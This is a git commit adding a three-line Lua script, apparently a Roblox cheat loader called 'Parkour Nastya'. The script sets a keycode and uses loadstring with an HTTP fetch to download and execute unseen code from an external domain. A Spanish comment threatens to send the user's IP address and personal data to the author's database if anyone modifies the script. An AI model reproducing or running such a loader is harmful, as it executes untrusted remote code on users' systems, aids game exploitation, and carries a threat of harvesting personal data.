6cb972b629f5680ab43c93cdbf16b86299edeeca
Dantect <109514454+Dantectuwu@users.noreply.github.com>
2022-12-24 19:43:37 -0300

    Create Parkour Nastya.lua

---
+++ Parkour Nastya.lua
@@ -0,0 +1,3 @@
+_G.keycode = "Parkour Nasty"
+--Cualquier intento de modificación mandará tu ip y muchos de tus datos a mi base de datos, no lo intentes <3
+loadstring(game:HttpGet("https://www.itots.tk/allscriptswithkeycode.lua"))()
